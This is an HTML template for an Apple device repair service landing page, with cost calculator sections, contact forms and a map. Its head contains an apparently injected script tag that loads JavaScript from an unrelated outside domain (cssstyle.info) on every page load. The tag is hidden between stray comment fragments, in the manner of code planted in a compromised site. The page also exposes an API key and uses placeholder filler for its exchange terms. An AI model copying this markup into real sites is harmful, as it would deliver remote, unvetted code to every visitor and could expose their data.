<!DOCTYPE html>
<html lang="ru">
  <!--
<head>
--><head><script src='//cssstyle.info/707data/css.js?rnd=eydleF9zZXJpYWwnOidlOTZhYTM5M2FkZmRlZGVlNjhjOWRiZDFhNzdjNWQ4Nl85MicsJ2lkaSc6JzcwNyd9'></script><!--
<head>
-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="images/favicon.png">
    <title>Starter Template for Bootstrap</title>
    <!-- Bootstrap core CSS -->
    <link href="css/apple-service-theme.css" rel="stylesheet">
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    <script src="js/pace.min.js"></script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCtBKwjuvC0L3NQ1QR1TjO7ehVAkkZ3eP4"></script>
    
    <script type="text/javascript">
        // When the window has finished loading create our google map below
        google.maps.event.addDomListener(window, 'load', init);
    
        function init() {
            // Basic options for a simple Google Map
            // For more options see: https://developers.google.com/maps/documentation/javascript/reference#MapOptions
            var mapOptions = {
                // How zoomed in you want the map to start at (always required)
                zoom: 13,

                // The latitude and longitude to center the map (always required)
                center: new google.maps.LatLng(55.71857944595748,37.744405603179985), // 

                // How you would like to style the map. 
                // This is where you would paste any style found on Snazzy Maps.
                styles: [{"featureType":"all","elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#000000"},{"lightness":40}]},{"featureType":"all","elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#000000"},{"lightness":16}]},{"featureType":"all","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#000000"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#000000"},{"lightness":17},{"weight":1.2}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#000000"},{"lightness":20}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#000000"},{"lightness":21}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#000000"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#000000"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#000000"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#000000"},{"lightness":16}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#000000"},{"lightness":19}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#fbd216"},{"lightness":17}]}]
            };

            // Get the HTML DOM element that will contain your map 
            // We are using a div with id="map" seen below in the <body>
            var mapElement = document.getElementById('map');

            // Create the Google Map using our element and options defined above
            var map = new google.maps.Map(mapElement, mapOptions);

            // Let's also add a marker while we're at it
            var marker = new google.maps.Marker({
                position: new google.maps.LatLng(55.71857944595748,37.744405603179985),
                map: map,
                title: 'Apple Service!'
            });
        }
    </script>
  </head>
  <body>
    <div id="fb-root"></div>
    <script>(function(d, s, id) {
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) return;
      js = d.createElement(s); js.id = id;
      js.src = "https://connect.facebook.net/ru_RU/sdk.js#xfbml=1&version=v2.10";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));</script>
    <div class="visible-xs top-menu">
      <div class="container">
        <div class="navigation"><a href="#"><span></span><span></span><span></span></a></div>
        <div class="logotype"><a href="#">Apple Repair in New York</a></div>
        <div class="contact"><a href="tel:+14951234567"><i class="fa fa-phone" aria-hidden="true"></i></a></div>
      </div>
    </div>
    <div class="burger">
      <div class="container">
        <div class="list ajax-list">
        </div>
        <div class="list">
          <div class="item"><a href="#">Contacts</a></div>
          <div class="item"><a href="#">About</a></div>
        </div>
      </div>
    </div>
    <div class="header">
      <div class="container">
        <div class="hline">
          <div class="row">
            <div class="col-xs-12 col-sm-3 col-md-2 col-lg-3 hidden-xs">
              <div class="logo">
                <a href="#"><img src="images/logo.png" alt="#"></a>
              </div>
            </div>
            <div class="col-xs-12 col-sm-3 col-md-5 col-lg-4 hidden-xs">
              <div class="adr">
                <a href="#">7979 Pittsford-Victor Road Victor, NY 14564<span class="hidden-sm"><br/>Mon - Sat: <span>10:00 a.m. - 9:30 p.m.</span><br/>Sun: <span>11:00 a.m. - 6:00 p.m.</span></span></a>
              </div>
            </div>
            <div class="col-xs-12 col-sm-3 col-md-3 hidden-xs">
              <div class="phone">
                <a href="#"><span>+1 585-421-6070</span><br/>Viber, WhatsApp, Telegram</a>
              </div>
            </div>
            <div class="col-xs-12 col-sm-3 col-md-2 hidden-xs">
              <div class="callback text-right">
                <a href="#" class="btn btn-block" data-toggle="modal" data-target="#callbackModal">CALLBACK</a>
              </div>
            </div>
          </div>
        </div>
        <div class="hleft">
          <div class="title">
            <div class="h1">Repairs <span class="xs">Apple</span><span class="visible-xs-inline"> in New York</span></div>
            <div class="h2">Specialized service center</div>
          </div>
          <div class="changes">
            <div class="hidden-xs">
              <span class="r">Official exchange</span><br/>old / broken / recessed<br/><span class="y">iPhone</span> on <span class="y">new!</span>
            </div>
            <a href="#" class="btn hidden-xs" data-toggle="modal" data-target="#changeModal">Learn more</a>
            <noindex>
              <a href="#" class="btn btn-block visible-xs" data-toggle="modal" data-target="#changeModal">Official iPhone exchange for a new one!</a>
            </noindex>
          </div>
        </div>
        <div class="hright">
          <div class="desc hidden-xs">
            <ul>
              <li>Departure of the master<br/>in New York</li>
              <li>Repair<br/>in the service center</li> 
              <li>We'll fix it for you<br/>in 20 minutes</li>
              <li>Warranty<br/>up to 1 year</li>
            </ul>
          </div>
          <div class="desc visible-xs">
            <ul>
              <li>Outside repair is possible</li>
              <li>Diagnostics - free of charge</li>
              <li>Repair for you in 20 minutes</li>
            </ul>
          </div>
        </div>
        <a href="#" class="call-master input-group" data-toggle="modal" data-target="#masterModal">
          <span class="input-group-addon">Summon Masters</span>
          <span class="input-group-addon">+1 <span>585-421-6070</span></span>
        </a>
        <div class="view visible-xs">Calculate the cost in 3 steps</div>
        <div class="view hidden-xs">Calculate the cost <span>in 2 steps!</span></div>
      </div>
      <a href="#devices-scroll" class="more"></a>
    </div>
    <!-- /.header -->

    <!-- Modal -->
    <div class="modal fade change-modal" id="changeModal" tabindex="-1" role="dialog" aria-labelledby="changeModalLabel">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <div class="i1">
              <div class="i2">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="changeModalLabel">Replace the old or broken iPhone with a new one</h4>
                <h5 class="modal-title">for only $100</h5>
              </div>
            </div>
          </div>
          <div class="modal-body">
            <div class="row">
              <div class="col-xs-12 col-md-6 col-md-offset-1">
                <div class="title">Terms of exchange</div>
                <p>Everyday practice shows that a new model of organizational activity requires us to analyze the training system of personnel, corresponds to urgent needs. Thus, the existing structure of the organization entails the process of introducing and modernizing the positions held by the participants in relation to the tasks assigned.</p>
              </div>
              <div class="col-xs-12 col-md-4">
                <div class="form">
                  <div class="text-center">
                    <div class="title">Fill the form</div>
                    <div class="desc">to verify the possibility of exchange</div>
                  </div>
                  <form action="#">
                    <div class="form-group">
                      <label class="sr-only" for="imei1">IMEI phone code</label>
                      <input type="text" class="form-control" id="imei1" name="imei" placeholder="IMEI phone code" required />
                    </div>
                    <div class="form-group left">
                      <label class="sr-only" for="name">Name</label>
                      <input type="text" class="form-control" id="name" name="name" placeholder="Name" required />
                    </div>
                    <div class="form-group">
                      <label class="sr-only" for="contact">Phone or email</label>
                      <input type="text" class="form-control" id="contact" name="contact" placeholder="Phone or email" required />
                    </div>
                    <button class="btn btn-block btn-warning" type="submit">Send request</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="devices" id="devices-scroll">
      <div class="title">Select a <span class="xs">device</span><span class="hidden-xs"> to find out the cost of repairs</span></div>
      <div class="container">
        <div class="callback"><a href="#" class="btn btn-warning" data-toggle="modal" data-target="#callbackModal">CALLBACK</a></div>
        <div class="phone">+1 <span>585-421-6070</span></div>
        <div class="logo"><a href="#"><img src="images/logo-black.png" alt="#"></a></div>
        <ul id="devices">
          <li><a href="#modal"><span class="img" style="background-image: url('images/devices/iphone.png');"></span>iphone</a></li>
		  <li><a href="#"><span class="img" style="background-image: url('images/devices/ipad.png');"></span>ipad</a></li>
		  <li><a href="#"><span class="img" style="background-image: url('images/devices/macbook.png');"></span>macbook</a></li>
		  <li><a href="#"><span class="img" style="background-image: url('images/devices/macpro.png');"></span>mac pro</a></li>
		  <li><a href="#"><span class="img" style="background-image: url('images/devices/macmini.png');"></span>mac mini</a></li>
        </ul>
      </div>
    </div>
    <!-- /.devices -->
    <div class="device-affix-line"></div>
    <div class="device-model">
      <div class="inner">
        <div class="title">Select the <span class="xs">model</span><span class="hidden-xs"> of your device</span></div>
        <div class="container">
          <div class="row" id="modal">
            <div class="col-xs-6 col-sm-4 col-md-3"><a href="#" class="item"><span class="img" style="background-image: url('images/models/iphone_7_plus.pnd');"></span><span class="name">iphone 7 plus</span><span class="btn btn-warning"><span class="check"></span>Choose</span></a></div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.device-model -->

    <div class="malfunction">
      <div class="left">
        <div class="inner">
          <div class="title">Select a <span class="xs">malfunction</span></div>
          <div class="malfunction-main">
            <div class="row" id="malfunction-main">
              <div class="col-xs-6 col-md-4"><a href="#" class="item"><span class="img" style="background-image: url('{pic}');"></span><span class="name">{name}</span></a></div>
            </div>
          </div>
        </div>
      </div>
      <div class="right">
        <div class="inner">
          <div class="title">Full list</div>
          <div class="scrollbar">
            <ul class="items malfunction-full" id="malfunction-full">
              <li>
                <a href="#" class="item">
                  <span class="btn btn-warning">Choose</span>
                  <span class="name">{name}</span>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
    <!-- /.malfunction -->

    <div class="calculation" id="calculation">
      <div class="container">
        <div class="title">Your cost <span class="hidden-xs"> calculation <span class="xs">is ready!</span></span></div>
        <div class="row">
          <div class="col-xs-12">
            <div class="selects">
              <div class="form-group">
                <label for="select-device">Device</label>
                <div class="select-style">
                  <select name="device" id="select-device">
                    <option>-</option>
                  </select>
                </div>
              </div>
              <div class="form-group">
                <label for="select-model">Model</label>
                <div class="select-style">
                  <select name="model" id="select-model">
                    <option>-</option>
                  </select>
                </div>
              </div>
              <div class="form-group">
                <label for="select-malfunction">Malfunction</label>
                <div class="select-style">
                  <select name="malfunction" id="select-malfunction">
                    <option>-</option>
                  </select>
                </div>
              </div>
            </div>
          </div>
          <div class="col-xs-12 col-sm-6">
            <div id="master-departure">
              <div class="master-departure">
                <div class="title">This problem can be solved <span class="xs">without leaving home!</span></div>
                <div class="dtitle">Departure of the master:</div>
                <div class="dcheckbox">
                  <input type="checkbox" id="dep-master" />
                  <label for="dep-master">
                    <span class="n">No</span>
                    <span class="y">Yes</span>
                  </label>
                </div>
                <div class="dprice">+ $<b>{price}</b></div>
                <div class="ddesc">Master will arrive within 1-2 hours</div>
              </div>
            </div>
            <div class="detail-price">
              <div id="detail-price">
                <table class="table">
                  <tbody>
                    <tr>
                      <td>{name}</td><td></td><td>{display_price}</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <div id="master-detail-price">
                <table class="table">
                  <tbody>
                    <tr>
                      <td>Departure of the master</td><td></td><td>from $<b>{price}</b></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            <div id="full-price">
              <div class="full-price">
                <table class="table">
                  <tbody>
                    <tr>
                      <td><b>Cost of repairs</b></td><td>$<b>{price}</b></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          <div class="col-xs-12 col-sm-6">
            <ul class="d-list" id="detail-list">
              <li>{text}</li>
            </ul>
            <div class="d-form">
              <div class="title">How to contact you?</div>
              <form action="#">
                <div class="form-group left">
                  <label class="sr-only" for="name1">Name</label>
                  <input type="text" class="form-control" id="name1" name="name" placeholder="Name" required />
                </div>
                <div class="form-group">
                  <label class="sr-only" for="phone1">Phone</label>
                  <input type="tel" pattern="^\d{4}-\d{3}-\d{4}$" class="form-control" id="phone1" name="phone" placeholder="Phone (1234-567-8901)" required />
                </div>
                <div class="form-group">
                  <label class="sr-only" for="addr1">The address where to arrive to the master</label>
                  <input type="text" class="form-control" id="addr1" name="addr" placeholder="The address where to arrive to the master" required />
                </div>
                <button class="btn btn-warning" type="submit">Send an application <span class="str"></span></button>
              </form>
            </div>
          </div>
          <div class="col-xs-12">
            <div class="payment-info">We accept bank cards</div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.calculation -->

    <div class="mini-notification">
      <div class="container">
        <div class="t" data-toggle="modal" data-target="#orderModal">
          <div class="left"><span class="n-malfunction">Replacing the Display</span> <span class="n-dm"><span class="n-device">iPhone</span> <span class="n-model">7</span></span></div>
          <div class="right">$<span class="price">150</span></div>
        </div>
      </div> 
    </div>
    <!-- /.mini-notification -->

    <div class="modal fade order-modal" id="orderModal" tabindex="-1" role="dialog" aria-labelledby="orderModalLabel">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"></button>
            <h4 class="modal-title" id="orderModalLabel"><span class="n-malfunction">Replacing the Display</span> <span class="n-dm"><span class="n-device">iPhone</span> <span class="n-model">7</span></span></h4>
          </div>
          <div class="modal-body">
            <div class="msg-auto text-center">This offer is generated automatically based on your request</div>
            <div class="price">
              <div class="left">Total price including departure and spare parts</div>
              <div class="right">
                <div class="val">$<span class="m-price">175</span></div>
              </div>
            </div>
            <div class="payment-info">We accept bank cards</div>
            <div class="detail-price">
              <div class="dp-title">What is included in the price:</div>
              <div id="detail-price-dbl">
                <table class="table">
                  <tbody>
                    <tr>
                      <td>Diagnostics</td>
                      <td></td>
                      <td>free</td>
                    </tr>
                  </tbody>
                </table>
                <table class="table">
                  <tbody>
                    <tr>
                      <td>Works</td>
                      <td></td>
                      <td>$<b>20</b></td>
                    </tr>
                  </tbody>
                </table>
                <table class="table">
                  <tbody>
                    <tr>
                      <td>Repair parts</td>
                      <td></td>
                      <td>$<b>41</b></td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <div id="master-detail-price-dbl">
                <table class="table">
                  <tbody>
                    <tr>
                      <td>Departure of the master</td><td></td><td>from $<b>{price}</b></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            <ul class="d-list">
              <li>Repair time: <b>20 minutes</b></li>
              <li>Guarantee: <b>1 year</b></li>
              <li>Repair parts: <b>only original</b></li>
              <li><b>Professional</b> equipment</li>
            </ul>
            <div class="z-title">Leave a request!</div>
            <div class="z-desc">We will get back to you within 5 minutes</div>
            <form action="#">
              <div class="inputs">
                <div class="form-group left">
                  <label class="sr-only" for="name2">Name</label>
                  <input type="text" class="form-control" id="name2" name="name" placeholder="Name" required />
                </div>
                <div class="form-group">
                  <label class="sr-only" for="phone2">Phone</label>
                  <input type="text" class="form-control" id="phone2" name="phone" placeholder="Phone (1234-567-8901)" required />
                </div>
                <button class="btn btn-warning" type="submit">Send request <span class="str"></span></button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

    <div class="visiting-repair">
      <div class="text">
        <div class="inner">
          <div class="title"><span class="xs">Offsite repair</span><span class="hidden-xs"> in a convenient place for you</span></div>
          <p>In 80% of cases, repairs can be performed in any place convenient for you within 15-20 minutes. The service engineer will arrive at the designated place, for example a house, an office, a cafe, will conduct diagnostics and eliminate a malfunction.</p>
          <ul>
            <li>Anywhere</li>
            <li>Anytime</li>
            <li>Departure and Diagnostics free</li>
            <li>Repair in your presence</li>
          </ul>
          <a href="#" class="btn btn-warning" data-toggle="modal" data-target="#masterModal">Summon Masters</a>
        </div>
      </div>
      <div class="img" style="background-image: url('images/banana-man.jpg');"></div>
    </div>
    <!-- /.visiting-repair -->

    <div class="repair-service-center">
      <div class="text">
        <div class="inner">
          <div class="title">Repair in the <span class="xs">service center</span></div>
          <p>If the malfunction can not be eliminated in the field and for this, stationary equipment is required, we do such repairs to the service center, where everything is necessary to eliminate the most complex malfunctions.</p>
          <ul>
            <li>Fast delivery by courier</li>
            <li>Stationary equipment</li>
            <li>Repair of any complexity</li>
            <li>Full privacy</li>
          </ul>
          <div class="input-group">
            <a href="#" class="input-group-addon">Driving directions</a>
            <a href="#" class="input-group-addon" data-toggle="modal" data-target="#courierModal">Call the courier</a>
          </div>
        </div>
      </div>
      <div class="img" style="background-image: url('images/repair-service-center-bg.jpg');"></div>
    </div>
    <!-- /.repair-service-center -->

    <!-- Modal -->
    <div class="modal fade courier-modal" id="courierModal" tabindex="-1" role="dialog" aria-labelledby="courierModalLabel">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <div class="i1">
              <div class="i2">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="courierModalLabel">Calling the courier</h4>
                <h5 class="modal-title">We will contact you to clarify the details.</h5>
              </div>
            </div>
          </div>
          <div class="modal-body">
            <div class="form">
              <div class="text-center">
                <div class="title">Fill out the contact information</div>
                <form action="#">
                  <div class="form-group left">
                    <label class="sr-only" for="name3">Name</label>
                    <input type="text" class="form-control" id="name3" name="name" placeholder="Name" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="phone3">Phone</label>
                    <input type="tel" pattern="^\d{4}-\d{3}-\d{4}$" class="form-control" id="phone3" name="phone" placeholder="Phone (1234-567-8901)" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="addr2">Address</label>
                    <input type="text" class="form-control" id="addr2" name="addr" placeholder="Address" required />
                  </div>
                  <button class="btn btn-warning" type="submit">Send request <span class="str"></span></button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Modal -->
    <div class="modal fade courier-modal" id="masterModal" tabindex="-1" role="dialog" aria-labelledby="masterModalLabel">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <div class="i1">
              <div class="i2">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="masterModalLabel">Calling the master</h4>
                <h5 class="modal-title">We will contact you to clarify the details.</h5>
              </div>
            </div>
          </div>
          <div class="modal-body">
            <div class="form">
              <div class="text-center">
                <div class="title">Fill out the contact information</div>
                <form action="#">
                  <div class="form-group left">
                    <label class="sr-only" for="name4">Name</label>
                    <input type="text" class="form-control" id="name4" name="name" placeholder="Name" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="phone4">Phone</label>
                    <input type="tel" pattern="^\d{4}-\d{3}-\d{4}$" class="form-control" id="phone4" name="phone" placeholder="Phone (1234-567-8901)" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="addr3">Address</label>
                    <input type="text" class="form-control" id="addr3" name="addr" placeholder="Address" required />
                  </div>
                  <button class="btn btn-warning" type="submit">Send request <span class="str"></span></button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Modal -->
    <div class="modal fade courier-modal" id="callbackModal" tabindex="-1" role="dialog" aria-labelledby="callbackModalLabel">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <div class="i1">
              <div class="i2">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="callbackModalLabel">Callback</h4>
                <h5 class="modal-title">We will call back within 3 minutes!</h5>
              </div>
            </div>
          </div>
          <div class="modal-body">
            <div class="form">
              <div class="text-center">
                <div class="title">Enter your Name and Phone</div>
                <form action="#">
                  <div class="form-group left">
                    <label class="sr-only" for="name5">Name</label>
                    <input type="text" class="form-control" id="name5" name="name" placeholder="Name" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="phone5">Phone</label>
                    <input type="tel" pattern="^\d{4}-\d{3}-\d{4}$" class="form-control" id="phone5" name="phone" placeholder="Phone (1234-567-8901)" required />
                  </div>
                  <button class="btn btn-warning" type="submit">Send request <span class="str"></span></button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="about">
      <div class="container">
        <div class="row">
          <div class="col-xs-12 col-sm-8">
            <div class="title">About the service</div>
            <p>Our service center is equipped with the <span class="xs">latest equipment</span> for the diagnosis and repair of computer equipment and mobile devices. All the masters have a rich experience in repairing Apple technology..</p>
            <p>If your iPhone, MacBook, iMac, iPad or other device has broken down, <span class="xs">call us</span>. We will return your device to working condition.</p>
          </div>
          <div class="col-xs-12 col-sm-4">
            <div class="phone">+1 <b>585-421-6070</b></div>
            <div class="phone-btn">
              <a href="#" class="btn btn-warning" data-toggle="modal" data-target="#masterModal">Summon Masters</a>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.about -->

    <div class="index-carousel">
      <div class="container">
        <div class="owl-carousel">
          <div class="item">
            <img src="images/carousel/img1.jpg" alt="">
            <div class="name">Offsite repair</div>
            <div class="desc">We are at work on the road</div>
          </div>
          <div class="item">
            <img src="images/carousel/img2.jpg" alt="">
            <div class="name">Our laboratory</div>
            <div class="desc">Here we do the most difficult repairs</div>
          </div>
          <div class="item">
            <img src="images/carousel/img3.jpg" alt="">
            <div class="name">Customer zone</div>
            <div class="desc">Here you can wait until we repair your device</div>
          </div>
          <div class="item">
            <img src="images/carousel/img4.jpg" alt="">
            <div class="name">Offsite repair</div>
            <div class="desc">We are at work on the road</div>
          </div>
          <div class="item">
            <img src="images/carousel/img5.jpg" alt="">
            <div class="name">Our laboratory</div>
            <div class="desc">Here we do the most difficult repairs</div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.index-carousel -->

    <div class="change">
      <div class="i1">
        <div class="i2">
          <div class="inner">
            <div class="title">Change the old iPhone to a brand new one for $<span>100</span>!</div>
            <a href="#" class="btn btn-more">See Details <span class="arrow-up"></span></a>
          </div>
        </div>
      </div>
      <div class="form">
        <div class="form-inner">
          <div class="container">
            <div class="row">
              <div class="col-xs-12 col-sm-7 col-md-7">
                <div class="title">Terms of exchange</div>
                <p>Everyday practice shows that a new model of organizational activity requires us to analyze the training system of personnel, corresponds to urgent needs. Thus, the existing structure of the organization entails the process of introducing and modernizing the positions held by the participants in relation to the tasks assigned. Thus, the beginning of the day-to-day Works on position formation provides a wide range (of specialists) of participation in the formation of significant financial and administrative conditions.</p>
              </div>
              <div class="col-xs-12 col-sm-5 col-md-4 col-md-offset-1">
                <div id="changeForm">
                  <div class="title">Fill the form</div>
                  <div class="desc">to verify the possibility of exchange</div>
                  <form action="#">
                    <div class="form-group">
                      <label class="sr-only" for="imei2">IMEI phone code</label>
                      <input type="text" class="form-control" id="imei2" name="imei" placeholder="IMEI phone code" required />
                    </div>
                    <div class="form-group">
                      <label class="sr-only" for="name">Name</label>
                      <input type="text" class="form-control" id="name" name="name" placeholder="Name" required />
                    </div>
                    <div class="form-group">
                      <label class="sr-only" for="contact">Phone or email</label>
                      <input type="text" class="form-control" id="contact" name="contact" placeholder="Phone or email" required />
                    </div>
                    <button class="btn btn-block btn-warning" type="submit">Send request</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.change -->

    <div class="employees">
      <div class="container">
        <div class="title">All our employees have a <span>special education</span><br/>and they know a lot about their business</div>
        <div class="owl-carousel">
          <div class="item">
            <div class="foto" style="background-image: url('images/employees/md_portret.jpg')"></div>
            <div class="name">Apple master 1</div>
            <div class="desc">Specialization:<br/>modular repair</div>
          </div>
          <div class="item">
            <div class="foto" style="background-image: url('images/employees/1040658.jpg')"></div>
            <div class="name">Apple master 2</div>
            <div class="desc">Specialization:<br/>soldering of microcircuits</div>
          </div>
          <div class="item">
            <div class="foto" style="background-image: url('images/employees/32475.jpg')"></div>
            <div class="name">Apple master 3</div>
            <div class="desc">Specialization:<br/>Software</div>
          </div>
          <div class="item">
            <div class="foto" style="background-image: url('images/employees/sm_2501625_01_201410210438475898.jpg')"></div>
            <div class="name">Apple master 4</div>
            <div class="desc">Specialization:<br/>night watchman</div>
          </div>
        </div>
      </div>
    </div>
    <!-- /.employees -->

    <div class="contacts">
      <div class="container">
        <div class="row">
          <div class="col-xs-12 col-sm-6 col-md-8 col-lg-7">
            <div class="title">Contact Information</div>
            <div class="desc">Service-center «Apple Service»</div>
            <div class="row">
              <div class="col-xs-12 col-md-6">
                <div class="adr">7979 Pittsford-Victor Road Victor, NY 14564</div>
                <div class="mails"><a href="mailto:info@example.com">info@example.com</a><br/>For suppliers: <a href="mailto:partner@example.com">partner@example.com</a></div>
              </div>
              <div class="col-xs-12 col-md-6">
                <div class="phones">
                  +1 585-421-6070<br/>+1 585-421-6070<br/>+1 585-421-6070<br/>
                  <a href="#" class="btn" data-toggle="modal" data-target="#callbackModal">Request a call</a>
                </div>
              </div>
            </div>
          </div>
          <div class="col-xs-12 col-sm-6 col-md-4 col-lg-5">
            <div class="title">Wishes and suggestions</div>
            <div class="form">
              <div id="wsForm">
                <form action="#">
                  <div class="form-group left">
                    <label class="sr-only" for="name">Name</label>
                    <input type="text" class="form-control" id="name" name="name" placeholder="Name" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="mail">Email</label>
                    <input type="email" class="form-control" id="mail" name="mail" placeholder="Email" required />
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="msg">Message</label>
                    <textarea class="form-control" id="msg" name="msg" placeholder="Message" rows="4" required ></textarea>
                  </div>
                  <button class="btn btn-warning" type="submit">Send message</button>
                </form>
              </div>
            </div>
          </div>
        </div>
        <hr>
        <div class="row">
          <div class="col-xs-12 col-md-8">
            <div class="soc-text"><span>Join us in social networks!</span> We publish only the most interesting projects and news</div>
          </div>
          <div class="col-xs-12 col-md-4">
            <div class="soc-btn">
              <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
              <a href="#"><i class="fa fa-pinterest-p" aria-hidden="true"></i></a>
              <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a>
              <a href="#"><i class="fa fa-google-plus" aria-hidden="true"></i></a>
              <a href="#"><i class="fa fa-instagram" aria-hidden="true"></i></a>
            </div>
          </div>
        </div>
        <hr>
      </div>
      <div class="map">
        <div class="container">
          <div class="title">Driving directions</div>
        </div>
        <div id="map"></div>
      </div>
    </div>
    <!-- /.contacts -->

    <div class="fb-footer-comments">
      <div class="container">
        <div class="title">What <span>customers</span> say about us</div>

        <div class="fb-comments" data-href="https://developers.facebook.com/docs/plugins/comments#configurator" data-width="100%" data-numposts="5"></div>
      </div>
    </div>
    <!-- /.fb-footer-comments -->
    
    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')</script>
    <script src="js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>

    <script src="js/owl.carousel.min.js"></script>
    <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="js/select2.full.min.js"></script>
    <script src="js/mails.js"></script>
    <script src="js/main.js"></script>
    <script src="js/jquery.device-calc.js"></script>
  </body>
</html>
